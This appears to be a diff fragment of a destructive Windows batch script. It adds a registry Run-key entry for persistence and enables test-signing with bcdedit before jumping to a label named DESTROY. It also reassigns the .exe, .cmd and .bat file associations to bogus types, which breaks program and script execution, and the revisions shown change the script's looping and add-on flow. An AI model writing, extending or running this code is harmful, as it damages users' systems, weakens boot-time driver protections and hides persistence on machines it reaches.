@@ -212,10 +212,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cm
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
 :AAAAJJ
-echo,
-echo Something Happened :)
-cls
-goto RESTART
+goto ADDONS
 :BCD
 bcdedit /set TESTSIGNING on
 goto DESTROY
@@ -223,4 +220,5 @@ goto DESTROY
 @rem --Additional Commands go below--
 assoc .exe=jaydumb
 assoc .cmd=windfufBest
-assoc .bat=CmdV4
+assoc .bat=CmdV5
+goto RESTART
